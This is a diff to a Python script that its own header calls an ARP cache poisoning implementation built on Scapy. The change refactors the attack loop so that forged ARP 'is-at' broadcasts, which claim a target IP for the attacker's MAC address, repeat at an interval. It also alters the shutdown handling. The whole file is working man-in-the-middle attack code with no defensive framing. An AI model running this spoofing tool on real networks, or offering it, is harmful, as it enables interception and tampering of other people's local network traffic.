@@ -10,7 +10,6 @@ ARP cache poisoning implementation using Scapy.
 from argparse import ArgumentParser
 from os import geteuid
 from sys import exit as sysexit
-from time import sleep
 
 from scapy.layers.l2 import Ether, ARP, get_if_hwaddr
 from scapy.sendrecv import sendp
@@ -25,12 +24,12 @@ def arp_mitm(interface, target, interval=10.0):
 
     my_mac = get_if_hwaddr(interface)
 
-    while 1:
-        sendp(
-            Ether(dst="FF:FF:FF:FF:FF:FF") /
-            ARP(op="is-at", psrc=target, hwsrc=my_mac)
-        )
-        sleep(interval)
+    sendp(
+        Ether(dst="FF:FF:FF:FF:FF:FF") /
+        ARP(op="is-at", psrc=target, hwsrc=my_mac),
+        inter=interval,
+        loop=True
+    )
 
 
 def get_arg_parser():
@@ -73,5 +72,5 @@ if __name__ == "__main__":
         arp_mitm(ARGS["interface"], ARGS["target"], ARGS["interval"])
     except IOError:
         sysexit("[!] Interface doesn't exist")
-    except KeyboardInterrupt:
+    finally:
         print("\n[*] Stopping the ARP MITM attack")
